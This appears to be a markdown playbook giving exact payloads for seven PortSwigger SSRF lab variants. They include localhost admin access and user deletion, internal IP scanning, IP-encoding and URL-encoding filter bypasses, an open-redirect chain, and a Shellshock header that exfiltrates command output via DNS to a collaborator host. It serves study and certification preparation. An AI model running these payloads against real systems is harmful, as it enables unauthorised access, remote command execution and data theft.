---
name: "SSRF — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1190"]
tools: [burp-suite, curl, sqlmap, ffuf, python]
difficulty: "advanced"
---

# SSRF — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. Difficulty: 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- Studying for BSCP (Burp Suite Certified Practitioner) certification
- Testing real-world targets for these vulnerability classes
- Bug bounty hunting — these exact techniques find real bugs
- Building exploitation chains

## Prerequisites
- Burp Suite Professional (Community works for most)
- Browser with proxy configured
- Burp Collaborator or interactsh for OOB testing


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: Basic against local server 🟢 APPRENTICE
```http
POST /product/stock HTTP/1.1

stockApi=http://localhost/admin
```
Access admin panel via localhost, then delete user: `stockApi=http://localhost/admin/delete?username=carlos`
---

### Lab 2: Against another back-end 🟢 APPRENTICE
```http
stockApi=http://192.168.0.§1§:8080/admin
```
Burp Intruder: scan `192.168.0.1-255` on port 8080 to find internal admin.
---

### Lab 3: Blind with out-of-band 🟡 PRACTITIONER
```http
Referer: http://BURP-COLLAB.net
```
Some apps fetch analytics from Referer URL server-side.
---

### Lab 4: Blacklist-based filter bypass 🟡 PRACTITIONER
```http
stockApi=http://127.1/Admin
# Bypasses: 127.1 (shorthand), Admin (case variation)
# Also try: http://2130706433 (decimal IP), http://017700000001 (octal)
```
---

### Lab 5: Filter bypass via open redirect 🟡 PRACTITIONER
```http
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
```
SSRF filter checks stockApi domain. Open redirect on same domain fetches internal URL.
---

### Lab 6: Blind SSRF with Shellshock 🔴 EXPERT
```http
Referer: http://192.168.0.§1§:8080
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).COLLAB.net
```
Blind SSRF + Shellshock on internal server. Scan internal range, exfiltrate via DNS.
---

### Lab 7: Whitelist-based filter 🔴 EXPERT
```http
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
# URL: localhost#@stock.weliketoshop.net → browser sees stock..., server sees localhost
# Double URL encode: %23 -> %2523
```
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research Methodology
When a standard technique doesn't work:
1. **Identify the filter**: What chars/patterns are blocked?
2. **Research bypasses**: Search GitHub, Twitter, PortSwigger Research for new techniques
3. **Fuzz extensively**: Use Burp Intruder with custom charset/tag lists
4. **Chain vulnerabilities**: Combine two medium findings into one critical
5. **Check encoding layers**: URL, HTML entity, Unicode, double-encode, XML entity


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PortSwigger All Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
